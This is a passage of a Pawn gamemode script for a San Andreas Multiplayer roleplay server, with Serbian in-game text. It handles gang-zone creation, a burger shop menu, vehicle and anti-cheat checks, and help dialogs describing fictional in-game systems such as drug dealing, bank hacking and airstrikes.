			}
			else if( CreatingPos[ playerid ][ 3 ] > CreatingPos[ playerid ][ 1 ] ) {
			    gZoneInfo[ id ][ gZoneMaxY ] = CreatingPos[ playerid ][ 3 ];
				gZoneInfo[ id ][ gZoneMinY ] = CreatingPos[ playerid ][ 1 ];
			}

            gZoneInfo[ id ][ gZoneID ] = GangZoneCreate( gZoneInfo[ id ][ gZoneMinX ], gZoneInfo[ id ][ gZoneMinY ], gZoneInfo[ id ][ gZoneMaxX ], gZoneInfo[ id ][ gZoneMaxY ] );
			GZone_Save( id );
			gZoneInfo[ id ][ gZoneRectAngle ] = CreateDynamicRectangle( gZoneInfo[ id ][ gZoneMinX ], gZoneInfo[ id ][ gZoneMinY ], gZoneInfo[ id ][ gZoneMaxX ], gZoneInfo[ id ][ gZoneMaxY ], -1, -1, -1 );

            SendInfoMessage( playerid, "Koristi "col_white"LMB"col_crvena" da postavis pozicije." );
			SendInfoMessage( playerid, "Sada sacuvaj poziciju za pickup i text." );
        }
        else if( CreatingGZone[ playerid ] == 3 ) {
        
            new Float:Pos[ 3 ], stringic[ 24 ];
        
            GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );

            new id = CreatingGZoneID[playerid];
        
            // new id = IsCordsInGZone( CreatingGZoneID[ playerid ], Pos[ 0 ], Pos[ 1 ] );

            if(!IsPlayerInDynamicArea(playerid, gZoneInfo[ id ][ gZoneRectAngle ])) return SendErrorMessage( playerid, "Moras sacuvati u zoni koju kreiras." );

		    // if( id != CreatingGZoneID[ playerid ] ) return SendErrorMessage( playerid, "Moras sacuvati u zoni koju kreiras." );

            ShowPlayerDialog(playerid, dialog_GZonaVrsta, DIALOG_STYLE_LIST, D_NASLOV, "0.Obicna Zona\n1.Specijalna Zona\n2.Materijali", "Potvrdi", " ");
        
            gZoneInfo[ id ][ gZonePickupPos ][ 0 ] = Pos[ 0 ];
            gZoneInfo[ id ][ gZonePickupPos ][ 1 ] = Pos[ 1 ];
            gZoneInfo[ id ][ gZonePickupPos ][ 2 ] = Pos[ 2 ];

            gZoneInfo[id][gZoneVrsta] = 0;
        
            gZoneInfo[ id ][ gZoneTaken ] = false;
            gZoneInfo[ id ][ gZoneTakeable ] = true;
            gZoneInfo[ id ][ gZoneTime ] = 0;
        
			gZoneInfo[ id ][ gZonePickup ] = CreateDynamicPickup( 1313, 1, gZoneInfo[ id ][ gZonePickupPos ][ 0 ], gZoneInfo[ id ][ gZonePickupPos ][ 1 ], gZoneInfo[ id ][ gZonePickupPos ][ 2 ], 0, 0 );
            new string[256];
            format(string, sizeof(string), ""col_white"[ TERITORIJA ]\nTeritorija je "col_crvena"slobodna"col_white"\nVrsta Zone : "col_crvena"%s"col_white"\nAko zelis da je zauzmes kucaj "col_crvena"/zauzmi", getZoneType(id));
			gZoneInfo[ id ][ gZone3D ] = CreateDynamic3DTextLabel( string, BELA, gZoneInfo[ id ][ gZonePickupPos ][ 0 ], gZoneInfo[ id ][ gZonePickupPos ][ 1 ], gZoneInfo[ id ][ gZonePickupPos ][ 2 ], 15.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, 0, 0 );

            format( stringic, sizeof( stringic ), "0x%s66", gZoneInfo[ id ][ gZoneColor ] );
            GangZoneShowForAll( gZoneInfo[ id ][ gZoneID ], HexToInt( stringic ) );

            GZone_Save( id );

		}


        if( ListaBurg[ playerid ] > 0 ) {
	        if( PlayerInfo[ playerid ][ xNovac ] < 20 ) return SendErrorMessage( playerid, "Nemate dovoljno novca(20$)." );
	        if( ListaBurg[ playerid ] == 1 )
	        {
		        SetPlayerCameraPos( playerid, 377.4937, -67.9324, 1002.1277);
				SetPlayerCameraLookAt( playerid, 377.5477, -66.9359, 1001.6640); //2
				ListaBurg[ playerid ] = 2;
				PlayerTextDrawSetString( playerid, CKilometri[ playerid ][ 1 ], "Big Mac" );
				PlayerTextDrawSetString( playerid, CKilometri[ playerid ][ 2 ], "Cena: 70$" );
			}
			else if( ListaBurg[ playerid ] == 2 )
	        {
				SetPlayerCameraPos( playerid, 378.1165, -67.9661, 1002.1277);
				SetPlayerCameraLookAt( playerid, 378.1705, -66.9697, 1001.6640); // 3
				ListaBurg[ playerid ] = 3;
				PlayerTextDrawSetString( playerid, CKilometri[ playerid ][ 1 ], "Cheeseburger" );
				PlayerTextDrawSetString( playerid, CKilometri[ playerid ][ 2 ], "Cena: 60$" );
			}
	        else if( ListaBurg[ playerid ] == 3 )
	        {
				SetPlayerCameraPos( playerid, 378.7393, -67.9999, 1002.1277);
				SetPlayerCameraLookAt( playerid, 378.7933, -67.0034, 1001.6640); // 4
				ListaBurg[ playerid ] = 4;
				PlayerTextDrawSetString( playerid, CKilometri[ playerid ][ 1 ], "Chicken Burger" );
				PlayerTextDrawSetString( playerid, CKilometri[ playerid ][ 2 ], "Cena: 60$" );
			}
	        else if( ListaBurg[ playerid ] == 4 )
	        {
				SetPlayerCameraPos( playerid, 379.3621, -68.0336, 1002.1277);
				SetPlayerCameraLookAt( playerid, 379.4161, -67.0371, 1001.6640); // 5
				ListaBurg[ playerid ] = 5;
				PlayerTextDrawSetString( playerid, CKilometri[ playerid ][ 1 ], "Country Burger" );
				PlayerTextDrawSetString( playerid, CKilometri[ playerid ][ 2 ], "Cena: 75$" );
			}
			else if( ListaBurg[ playerid ] == 5 )
	        {
				SetPlayerCameraPos( playerid, 376.8709, -67.8987, 1002.1277);
				SetPlayerCameraLookAt( playerid, 376.9249, -66.9022, 1001.6640); // 1
				ListaBurg[ playerid ] = 1;
				PlayerTextDrawSetString( playerid, CKilometri[ playerid ][ 1 ], "Hamburger" );
				PlayerTextDrawSetString( playerid, CKilometri[ playerid ][ 2 ], "Cena: 65$" );
			}
		}
    }
    else if( PRESSED( KEY_YES ) ) {

        if(NargiluIznajmio[ playerid ] != 0) {
            for(new i; i < sizeof(NargilaInfo); i++) {
                if(IsPlayerInRangeOfPoint(playerid, 3.0, NargilaInfo[ i ][ nargilaPosX ], NargilaInfo[ i ][ nargilaPosY ], NargilaInfo[ i ][ nargilaPosZ ])) {
                    new vreme = gettime();
                    if(vreme < (UvukoDim[ playerid ] + 5)) return 0;
                    ApplyAnimation(playerid,"SMOKING","M_smk_drag",4.1,0,0,0,0,0,1);
                    NargilaDim[ i ] = CreateObject(18716,NargilaInfo[ i ][ nargilaPosX ], NargilaInfo[ i ][ nargilaPosY ], NargilaInfo[ i ][ nargilaPosZ ],0.0000000,0.0000000,0.0000000);
                    SetTimerEx("DimNargile", 3000, false, "i", i);
                    UvukoDim[ playerid ] = gettime();

                    return 1;
                }
            }
        }

    	if(RadiVojnik{playerid} && TrebaDaPokupiVakcinu{playerid})
		{
			if(IsPlayerInRangeOfPoint(playerid, 2.0, 271.8935,1854.0039,8.7649))
			{
				DestroyDynamicObject(Vakcina[playerid]);
				VojnikMessage(playerid, "Uspesno si uzeo vakcinu! Sada pobegni iz baze!");
				TrebaDaPokupiVakcinu{playerid} = false;
				defer TimerPozivGeneral(playerid);
				return 1;
			}
			else return VojnikMessage(playerid, "Nisi kod vakcine!");
		}
	}
    else if( ( newkeys == KEY_SECONDARY_ATTACK ) && ListaBurg[ playerid ] > 0 ) {
    
        if( ListaBurg[ playerid ] == 1 ) {
        
            if( PlayerInfo[ playerid ][ xNovac ] < 3 ) return SendErrorMessage( playerid, "Nemate dovoljno novca(3 $)." );
            TogglePlayerControllable( playerid, 1);
            DajIgracuNovac( playerid, -65 ); DodajIgracuHP( playerid, 30 );
            BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--; BussinesMoney( uFirmi[ playerid ], 55 );
            SetCameraBehindPlayer( playerid );
            ListaBurg[ playerid ] = 0; OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
			format( globalstring, sizeof( globalstring ), "%s desnom rukom uzima hranu sa stola i jede.", ImeIgraca( playerid ) );
			PorukaRadius(20.0 , playerid, globalstring, LJUBICASTA );
	        CKilometriTDControl( playerid, false );
		}
		else if( ListaBurg[ playerid ] == 2 ) {
		
            if( PlayerInfo[ playerid ][ xNovac ] < 4 ) return SendErrorMessage( playerid, "Nemate dovoljno novca(4 $)." );
            TogglePlayerControllable( playerid, 1);
            DajIgracuNovac( playerid, -70 ); DodajIgracuHP( playerid, 30 );
            BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--; BussinesMoney( uFirmi[ playerid ], 60 );
            SetCameraBehindPlayer( playerid );
            ListaBurg[ playerid ] = 0; OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
            format( globalstring, sizeof( globalstring ), "%s desnom rukom uzima hranu sa stola i jede.", ImeIgraca( playerid ) );
			PorukaRadius(20.0 , playerid, globalstring, LJUBICASTA );
	        CKilometriTDControl( playerid, false );
		}
		else if( ListaBurg[ playerid ] == 3 )
        {
            if( PlayerInfo[ playerid ][ xNovac ] < 3 ) return SendErrorMessage( playerid, "Nemate dovoljno novca(3 $)." );
            TogglePlayerControllable( playerid, 1);
            DajIgracuNovac( playerid, -60 ); DodajIgracuHP( playerid, 30 );
            BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--; BussinesMoney( uFirmi[ playerid ], 52 );
            SetCameraBehindPlayer( playerid );
            ListaBurg[ playerid ] = 0; OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
            format( globalstring, sizeof( globalstring ), "%s desnom rukom uzima hranu sa stola i jede.", ImeIgraca( playerid ) );
			PorukaRadius(20.0 , playerid, globalstring, LJUBICASTA );
	        CKilometriTDControl( playerid, false );
		}
		else if( ListaBurg[ playerid ] == 4 )
        {
        	if( PlayerInfo[ playerid ][ xNovac ] < 5 ) return SendErrorMessage( playerid, "Nemate dovoljno novca(5 $)." );
            TogglePlayerControllable( playerid, 1);
            DajIgracuNovac( playerid, -60 ); DodajIgracuHP( playerid, 30 );
            BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--; BussinesMoney( uFirmi[ playerid ], 52 );
            SetCameraBehindPlayer( playerid );
            ListaBurg[ playerid ] = 0; OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
            format( globalstring, sizeof( globalstring ), "%s desnom rukom uzima hranu sa stola i jede.", ImeIgraca( playerid ) );
			PorukaRadius(20.0 , playerid, globalstring, LJUBICASTA );
	        CKilometriTDControl( playerid, false );
		}
		else if( ListaBurg[ playerid ] == 5 )
        {
            if( PlayerInfo[ playerid ][ xNovac ] < 5 ) return SendErrorMessage( playerid, "Nemate dovoljno novca(5 $)." );
            TogglePlayerControllable( playerid, 1);
            DajIgracuNovac( playerid, -75 ); DodajIgracuHP( playerid, 30 );
            BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--; BussinesMoney( uFirmi[ playerid ], 65 );
            SetCameraBehindPlayer( playerid );
            ListaBurg[ playerid ] = 0; OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
            format( globalstring, sizeof( globalstring ), "%s desnom rukom uzima hranu sa stola i jede.", ImeIgraca( playerid ) );
			PorukaRadius(20.0 , playerid, globalstring, LJUBICASTA );
	        CKilometriTDControl( playerid, false );
		}
	}
	else if( ( newkeys == KEY_JUMP ) && ListaBurg[ playerid ] > 0 )
    {
        SCM( playerid, CRVENA, "Odustali ste od kupovine!");
	  	ListaBurg[ playerid ] = 0;
		TogglePlayerControllable( playerid, true );
		SetCameraBehindPlayer( playerid );
	    CKilometriTDControl( playerid, false );
    }
    else if( ( newkeys == KEY_CROUCH ) && NearestGate( playerid ) != -1 ) {
    	if( GateData[ NearestGate( playerid ) ][ gateFor ] == 1 ) {
    	    if( GateData[ NearestGate( playerid ) ][ gateOrgID ] != -1 ) {
				if( PlayerInfo[ playerid ][ xAdmin ] == 7 || GateData[ NearestGate( playerid ) ][ gateOrgID ] == PlayerInfo[ playerid ][ xClan ] ) {
				    Gate_Operate( playerid, NearestGate( playerid ) );
				}
			}
    	}
        else if( GateData[ NearestGate( playerid ) ][ gateFor ] == 2 ) {
	        if( PlayerInfo[ playerid ][ xAdmin ] == 7 || strcmp( ImeIgraca( playerid ), GateData[ NearestGate( playerid ) ][ gateOwner ], true ) == 0 ) {
	        	Gate_Operate( playerid, NearestGate( playerid ) );
			}
		}
    }
    else if( ( newkeys == KEY_CROUCH ) && GetFactionType( playerid ) == ORG_TIP_PD ) {
        
        if(IsPlayerInRangeOfPoint(playerid, 8.0, 1041.1595, -1416.1842, 13.0604 )) {

            MoveDynamicObject(PDKapija, 1040.9955, -1416.1675, 13.0604, 7.0, 0.0, 0.0, 0.0);
            defer PDKapijaTimer();
            return 1;
        }
    }
	return true;
}

public OnPlayerUpdate( playerid ) {

    if(TimerAutoPilot[playerid] == 1)
        AutoPilot(playerid);

    if(GetPVarInt(playerid, "laser") == 1)
    {
        RemovePlayerAttachedObject(playerid, 0);
        if ((IsPlayerInAnyVehicle(playerid)) || (IsPlayerInWater(playerid))) return 1;
        switch (GetPlayerWeapon(playerid))
        {       
            case 30:
            {
                if (IsPlayerAiming(playerid))
                {
                    if (GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_DUCK)
                    {
                        SetPlayerAttachedObject(playerid, 0, 18643, 6, 0.628249, -0.027766, 0.078052, -6.621746, 352.552642, 355.084289);
                    }
                    else
                    {
                        SetPlayerAttachedObject(playerid, 0, 18643, 6, 0.628249, -0.027766, 0.078052, -1.621746, 356.202667, 355.084289);
                    }
                }
                else
                {
                    if (GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_DUCK)
                    {
                        SetPlayerAttachedObject(playerid, 0, 18643, 6, 0.663249, -0.02976, 0.080051, -11.131746, 358.302734, 353.384216);
                    }
                    else
                    {
                        SetPlayerAttachedObject(playerid, 0, 18643, 6, 0.663249, -0.02976, 0.080051, -11.131746, 358.302734, 353.384216);
                    }
                }
            }
            case 31:
            {
                if (IsPlayerAiming(playerid))
                {
                    if (GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_DUCK)
                    {
                        SetPlayerAttachedObject(playerid, 0, 18643, 6, 0.528249, -0.020266, 0.068052, -6.621746, 352.552642, 355.084289);
                    }
                    else
                    {
                        SetPlayerAttachedObject(playerid, 0, 18643, 6, 0.528249, -0.020266, 0.068052, -1.621746, 356.202667, 355.084289);
                    }
                }
                else
                {
                    if (GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_DUCK)
                    {
                        SetPlayerAttachedObject(playerid, 0, 18643, 6, 0.503249, -0.02376, 0.065051, -11.131746, 357.302734, 354.484222);
                    }
                    else
                    {
                        SetPlayerAttachedObject(playerid, 0, 18643, 6, 0.503249, -0.02376, 0.065051, -11.131746, 357.302734, 354.484222);
                    }
                }
            }
        }
    }   

    // if(IsValidPlayerObject(playerid, snowobj[playerid])) {

    //     GetPlayerCameraPos(playerid,snowX,snowY,snowZ);
    //     MovePlayerObject(playerid,snowobj[playerid],snowX,snowY,snowZ-5,9999.0);
    // }

    if( IsPlayerInAnyVehicle( playerid )&& GetPlayerState( playerid ) == PLAYER_STATE_DRIVER ) {
	    new vehicle = GetPlayerVehicleID( playerid );
	    if( !IsVehicleBajs( vehicle ) ) {
			new string[ 30 ];
			format( string, sizeof( string ), "%d", GetSpeed( playerid ) );
			PlayerTextDrawSetString( playerid, Brzinomer[ playerid ][ 2 ], string );
			new stringic[ 30 ];
			format( stringic, sizeof( stringic ), "%d", Fuel[ vehicle ] );
			PlayerTextDrawSetString( playerid, Brzinomer[ playerid ][ 5 ], stringic );

   //          // new Float:hpveh; GetVehicleHealth(vehicle, hpveh);
   //          // format( stringic, sizeof( stringic ), "%d", hpveh );
   //          // PlayerTextDrawSetString( playerid, Brzinomer[ playerid ][ 4 ], stringic );

			new stringic1[ 30 ];
			format( stringic1, sizeof( stringic1 ), "~w~%s", GetVehicleFuelType( vehicle ) );
		}
	}
    if( RadioAktiviran[ playerid ] == 1 && !IsPlayerInAnyVehicle( playerid ) ) return RadioAktiviran[ playerid ] = 0, StopAudioStreamForPlayer( playerid );
    if( AdminDuty[ playerid ] ) {
		new Float:H; GetPlayerHealth( playerid, H );
		new Float:Armour; GetPlayerArmour( playerid, Armour );
		if( H < 99.0 )	Novi_SetPlayerHealth( playerid, 150 );
		if( Armour < 99.0 )	Novi_SetPlayerArmour( playerid, 100 );

        if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER) {

            new Float:VehHP;
            GetVehicleHealth(GetPlayerVehicleID(playerid), VehHP);
            if(VehHP < 1000.0) {

                Novi_RepairVehicle( playerid, GetPlayerVehicleID( playerid ) );
                Novi_SetVehicleHealth( GetPlayerVehicleID( playerid ), 1000.0 );
                antiCheatCS[ playerid ][ VehRepairTime ] = 3;
                vCanDrive[ GetPlayerVehicleID( playerid ) ] = 1;
            }
        }

	}

	if( GetPlayerState( playerid ) == PLAYER_STATE_DRIVER && antiCheatCS[ playerid ][ RemoveVehicle ] == false ) {
		if( GetPlayerVehicleID( playerid ) != antiCheatCS[ playerid ][ EnteredVehicle ] && GetPlayerVehicleID( playerid ) > 0 ) {
            if(DronVozi[playerid] == -1) {
    			format( globalstring, sizeof( globalstring ), "| V:AC | Moguc SPAM/Port vozila!!! || %s[ID: %d] |LEVEL: |%d|| Koristi /spec!!!", ImeIgraca( playerid ), playerid, PlayerInfo[ playerid ][ xLevel ] );
    			AdminPoruka( -1, globalstring );
    			Novi_RemovePlayerFromVehicle( playerid ); 
            }
		}
	}

  	if( GetPlayerCameraMode( playerid ) == 53 ) {
        new Float:kLibPos[ 3 ];
        GetPlayerCameraPos( playerid, kLibPos[ 0 ], kLibPos[ 1 ], kLibPos[ 2 ] );
        if( kLibPos[ 2 ] < -50000.0 || kLibPos[ 2 ] > 50000.0 ) {
            format( globalstring, sizeof( globalstring ), "| V:AC | %s je kickovan sa servera. Razlog: "col_white"Weapon Crash", ImeIgraca( playerid ) );
			AdminPoruka( SVETLOCRVENA, globalstring );
			Kickovanje( playerid, ""col_white"Ti si kickovan sa servera. Razlog: "col_crvena"Weapon Crash");
            return 0;
        }
    }
	
  	if( flymodecamera[ playerid ][ cameramode ] == true ) {
		new keys,ud,lr;
		GetPlayerKeys(playerid,keys,ud,lr);

		if(flymodecamera[ playerid ][mode] && (GetTickCount() - flymodecamera[ playerid ][ lastmove ] > 100))
		{
		    MoveCamera(playerid);
		}
		if(flymodecamera[ playerid ][udold] != ud || flymodecamera[ playerid ][lrold] != lr)
		{
			if((flymodecamera[ playerid ][udold] != 0 || flymodecamera[ playerid ][lrold] != 0) && ud == 0 && lr == 0){
				StopPlayerObject(playerid, flymodecamera[ playerid ][flyobject] );
				flymodecamera[ playerid ][mode]      = 0;
				flymodecamera[ playerid ][accelmul]  = 0.0;
			}
			else
			{
				flymodecamera[ playerid ][mode] = GetMoveDirectionFromKeys(ud, lr);
				MoveCamera(playerid);
			}
		}
		flymodecamera[ playerid ][udold] = ud; flymodecamera[ playerid ][lrold] = lr;
		return 0;
	}
	return true;
}

public OnPlayerStreamIn( playerid, forplayerid ) {

	return true;
}

public OnPlayerStreamOut( playerid, forplayerid)
{
	return true;
}

public OnVehicleStreamIn( vehicleid, forplayerid)
{
	return true;
}

public OnVehicleStreamOut( vehicleid, forplayerid)
{
	return true;
}

public OnDialogResponse( playerid, dialogid, response, listitem, inputtext[])
{
    new dStyle = DSL;
    if(strfind(inputtext, "%", true) != -1 || strfind(inputtext, "#", true) != -1)
	{
        SCM( playerid, CRVENA, "Uneli ste format koji server ne podrzava!");
		return 1;
	}

    if(dialogid == dialog_Sistemi && response) {

        new DialogStrgEx1[ 3000 ];

        switch(listitem) {

            case 0: {

                strcat( DialogStrgEx1, ""SRVBOJA1SCM"__________________________"col_white" Sistem Favella "SRVBOJA1SCM"__________________________\n\n");
                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Sve lokacije mozete kupiti kod kurve!\n\n");
                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Branje kokaina -> "col_white"Potrebno je otici na crno trziste i kupiti torbu za kokain.\n");
                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Branje kokaina -> "col_white"Zatim idemo na lokaciju za branje, gde cemo naci biljke kokaina\n");
                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Branje kokaina -> "col_white"Koristimo komandu /uberikoks, biljka se unisti i stvori nova u blizini\n");
                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Branje kokaina -> "col_white"Ukoliko vas neko ubije, a pritom imate kokain, taj kokain se gubi\n");
                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Branje kokaina -> "col_white"Ukoliko predjete granicu, a imate kokaina kod sebe, postoji sansa da podmitite carinika i da vas uhvati\n\n");

                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Prerada kokaina -> "col_white"Kada dodjemo na lokaciju za preradu, koristimo komandu /preradikokain [kolicina]\n");
                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Prerada kokaina -> "col_white"Potrebno je minimalno 50g za preradu, i vreme prerade zavisi na osnovu kolicinu\n");
                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Prerada kokaina -> "col_white"Kada se prerada zavrsi, mozemo da podignemo kokain komandom /preradjenikokain\n\n");

                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Prodaja kokaina -> "col_white"Koristimo komandu /prodajkokain i sacekamo da istekne vreme prodaje\n");
                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Prodaja kokaina -> "col_white"Bilo ko moze da spreci pljacku, a vi dok prodajete mozete se kretati oko prodajne tacke\n");
                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Prodaja kokaina -> "col_white"Prodaja nije uspela ako igraca ubije clan policije ili izadje iz range-a prodaje\n");
                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Prodaja kokaina -> "col_white"Ukoliko igraca u toku prodaje ubije clan mafije ili bande, prodaju moze nastaviti drugi clan bilo koje bande/mafije\n");
                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Prodaja kokaina -> "col_white"Kada se prodaja zavrsi, nosite torbu sa novcem u organizaciju, pri cemu ako umrete, torba ispada i moze je neko pokupiti\n\n");

                SPD(playerid, 0, DSMSG, ""SRVBOJA1SCM"Favella", DialogStrgEx1, "Potvrdi", "");

                return 1;
            }
            case 1: {

                strcat( DialogStrgEx1, ""SRVBOJA1SCM"__________________________"col_white" Sistem Bitcoin Workshop "SRVBOJA1SCM"__________________________\n\n");

                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Bitcoin Workshop -> "col_white"Sluzi za majnovanje bitcoina, i to je jedini nacin da se bitcoin dobije\n");
                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Bitcoin Workshop -> "col_white"Na svakih sat vremena, igracu u BTC Workshop stizu Bitcoini u zavisnosti od broja masina\n");
                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Bitcoin Workshop -> "col_white"Svaka naredna masina se moze kupiti u Black Marketu, i skuplja je od prethodne\n");
                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Bitcoin Workshop -> "col_white"Sa vremena na vreme moze se desiti da masina padne, pa je morate 'resetovati'\n\n");

                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Bitcoin Prodaja -> "col_white"Bitcoin se Bitcoin Servera mozete podici i prodati na dva nacina\n\n");
                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Bitcoin Prodaja Banka -> "col_white"Prodaja banci je 2.000$ i to je to za ovu prodaju\n");
                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Bitcoin Prodaja Black Market -> "col_white"Prodaja Black Marketu je 6.000$, ali postoji sansa da ne dobijete nista, dobijete pola novca ili sve\n\n");

                SPD(playerid, 0, DSMSG, ""SRVBOJA1SCM"Bitcoin Workshop", DialogStrgEx1, "Potvrdi", "");

                return 1;
            }

            case 2: {

                strcat( DialogStrgEx1, ""SRVBOJA1SCM"__________________________"col_white" Sistem Radionica ( Workshop ) "SRVBOJA1SCM"__________________________\n\n");

                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Radionica -> "col_white"Imovina gde mozete kupovati kola, popravljati i kasnije prodati\n");
                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Radionica -> "col_white"Sve se radi preko komande /workshop\n\n");

                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Radionica Kupovina Vozila -> "col_white"Vozilo se kupuje tako sto odaberete vozilo, TowTruck-om idete ne lokaciju i doterate vozilo nazad\n");
                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Radionica Kupovina Radnika -> "col_white"Mozete kupiti dodatne radnike, moguce je imati 2 dodatna radnika i vreme popravke je krace\n");
                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Radionica Kupovina Delova -> "col_white"Kupovina delova se vrsi na posebnoj lokaciji, i mozete imati MAX 12 delova\n\n");

                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Radionica Popravka -> "col_white"Za popravku vozila potrebno je 8 sati, i potrebno je 4 delova\n");
                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Radionica Popravka -> "col_white"Vreme popravke ako imate JEDNOG radnika je 4h\n");
                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Radionica Popravka -> "col_white"Vreme popravke ako imate DVA radnika je 2h\n\n");

                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Radionica Prodaja Vozila -> "col_white"Nakon zavrsene popravke mozete prodati vase vozilo komandom /workshop\n");
                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Radionica Prodaja Vozila -> "col_white"Takodje mozete imati maksimalno 2 vozila na popravci u vasoj radionici\n");

                SPD(playerid, 0, DSMSG, ""SRVBOJA1SCM"Radionice", DialogStrgEx1, "Potvrdi", "");

                return 1;
            }
            case 3: {

                strcat( DialogStrgEx1, ""SRVBOJA1SCM"__________________________"col_white" Sistem Kombija ( Policija ) "SRVBOJA1SCM"__________________________\n\n");

                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Sistem Kombija -> "col_white"Kombi funkcionise kao neki event za Bande, Mafije i Policiju\n");
                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Sistem Kombija -> "col_white"Kada Admin Pokrene kombi, ispred PD-a ce se stvoriti kombi sa novcem\n");
                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Sistem Kombija -> "col_white"Policija ce probati da dostavi kombi u LV, a zadatak ostalih je da ga ukradu i odnesu u svoju bazu\n\n");

                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Komande -> "col_white"/kombilokacija /kombigps /ugasikombigps /predajnovac\n");
                strcat( DialogStrgEx1, ""SRVBOJA1SCM"/kombilokacija -> "col_white"Pokazuje gde treba da dostavite kombi\n");
                strcat( DialogStrgEx1, ""SRVBOJA1SCM"/kombigps i /ugasikombigps -> "col_white"Paljenje i gasenje trenutne lokacije kombija\n");
                strcat( DialogStrgEx1, ""SRVBOJA1SCM"/predajnovac -> "col_white"Kada dodjete blizu lokacije dostave, kucajte /predajnovac\n");

                SPD(playerid, 0, DSMSG, ""SRVBOJA1SCM"Sistem Kombija", DialogStrgEx1, "Potvrdi", "");

                return 1;
            }
            case 4: {

                strcat( DialogStrgEx1, ""SRVBOJA1SCM"__________________________"col_white" Hakovanje Banke "SRVBOJA1SCM"__________________________\n\n");

                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Hakovanje Banke -> "col_white"Hakovanje banke funkcionise tako sto se hakuje u krugu banke ( oko banke )\n");
                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Hakovanje Banke -> "col_white"Potrebno je kupiti laptop sa crnog trzista i biti u bilo kom vozilu\n");
                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Hakovanje Banke -> "col_white"Komandom /hakovanjebanke zapocinjete i ne smete izaci iz kruga banke ili iz vozila do kraja hakovanja\n\n");

                SPD(playerid, 0, DSMSG, ""SRVBOJA1SCM"Hakovanje Banke", DialogStrgEx1, "Potvrdi", "");

                return 1;
            }
            case 5: {

                strcat( DialogStrgEx1, ""SRVBOJA1SCM"__________________________"col_white" AirStrike "SRVBOJA1SCM"__________________________\n\n");

                strcat( DialogStrgEx1, ""SRVBOJA1SCM"AirStrike -> "col_white"Da pozovete AirStrike morate da cucnete i kucate /airstrike\n");
                strcat( DialogStrgEx1, ""SRVBOJA1SCM"AirStrike -> "col_white"AirStrike mozete pozvati na svakih 20 minuta, tako sto nakon kucanja komande otvorite mapu i oznacite lokaciju\n");
                strcat( DialogStrgEx1, ""SRVBOJA1SCM"AirStrike -> "col_white"Ne smete biti mnogo udalje od lokacije gde pozivate AirStrike\n");
                strcat( DialogStrgEx1, ""SRVBOJA1SCM"AirStrike -> "col_white"Nakon sto pravilno oznacite lokacije, dobijate obavestenje da ce uskoro tu pasti AirStrike\n");
                strcat( DialogStrgEx1, ""SRVBOJA1SCM"AirStrike -> "col_white"Svim igracima u blizini par sekundi pre pada AirStrike-a ce se pokazati obavestenje i 'zona' na mapi\n");

                SPD(playerid, 0, DSMSG, ""SRVBOJA1SCM"AirStrike", DialogStrgEx1, "Potvrdi", "");

                return 1;
            }
            case 6: {

                strcat( DialogStrgEx1, ""SRVBOJA1SCM"__________________________"col_white" AirDrop "SRVBOJA1SCM"__________________________\n\n");

                strcat( DialogStrgEx1, ""SRVBOJA1SCM"AirDrop -> "col_white"Komandom /airdrop mozete pozvati odredjeni paket oruzija\n");
                strcat( DialogStrgEx1, ""SRVBOJA1SCM"AirDrop -> "col_white"Nakon sto odaberete i platite jedan od 3 paketa, sa neba ce poceti da pada vas drop\n");
